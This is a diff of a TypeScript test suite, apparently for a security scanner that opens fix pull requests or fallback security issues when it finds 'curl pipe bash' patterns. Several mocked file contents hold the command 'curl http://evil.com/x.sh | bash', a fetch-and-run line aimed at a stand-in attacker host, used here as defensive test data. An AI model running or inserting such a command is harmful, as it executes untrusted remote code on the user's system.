@@ -313,7 +313,7 @@ describe("pullRequest", () => {
           return {
             data: {
               type: "file",
-              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -370,13 +370,70 @@ describe("pullRequest", () => {
       expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/issues");
     });
 
-    it("falls back to security issue if git branch creation fails due to permission error", async () => {
+    it("deletes the file entirely if patching leaves it empty", async () => {
       requestMock.mockImplementation((route: string) => {
         if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
           return {
             data: {
               type: "file",
               content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
+              sha: "file-sha-123",
+            },
+          };
+        }
+        if (route === "GET /repos/{owner}/{repo}") {
+          return { data: { default_branch: "main" } };
+        }
+        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
+          return { data: { object: { sha: "base-sha-123" } } };
+        }
+        if (route === "POST /repos/{owner}/{repo}/git/refs") {
+          return { data: {} };
+        }
+        if (route === "DELETE /repos/{owner}/{repo}/contents/{path}") {
+          return { data: {} };
+        }
+        if (route === "POST /repos/{owner}/{repo}/pulls") {
+          return { data: { number: 100 } };
+        }
+        if (route === "GET /repos/{owner}/{repo}/collaborators") {
+          return { data: [] };
+        }
+        if (route === "GET /repos/{owner}/{repo}/labels") {
+          return { data: [] };
+        }
+        throw new Error(`Unexpected request: ${route}`);
+      });
+
+      const findings: Finding[] = [
+        {
+          rule: "curl-pipe-bash",
+          severity: "critical",
+          message: "curl pipe bash detected",
+          file: "test.sh",
+        },
+      ];
+
+      await openFixPR(mockOctokit, {
+        owner: "test-owner",
+        repo: "test-repo",
+        findings,
+      });
+
+      const routesCalled = requestMock.mock.calls.map((c) => c[0]);
+      expect(routesCalled).toContain("POST /repos/{owner}/{repo}/git/refs");
+      expect(routesCalled).toContain("DELETE /repos/{owner}/{repo}/contents/{path}");
+      expect(routesCalled).not.toContain("PUT /repos/{owner}/{repo}/contents/{path}");
+      expect(routesCalled).toContain("POST /repos/{owner}/{repo}/pulls");
+    });
+
+    it("falls back to security issue if git branch creation fails due to permission error", async () => {
+      requestMock.mockImplementation((route: string) => {
+        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
+          return {
+            data: {
+              type: "file",
+              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -422,7 +479,7 @@ describe("pullRequest", () => {
           return {
             data: {
               type: "file",
-              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -523,7 +580,7 @@ describe("pullRequest", () => {
           return {
             data: {
               type: "file",
-              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -703,7 +760,7 @@ describe("pullRequest", () => {
           return {
             data: {
               type: "file",
-              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
               sha: "file-sha-123",
             },
           };
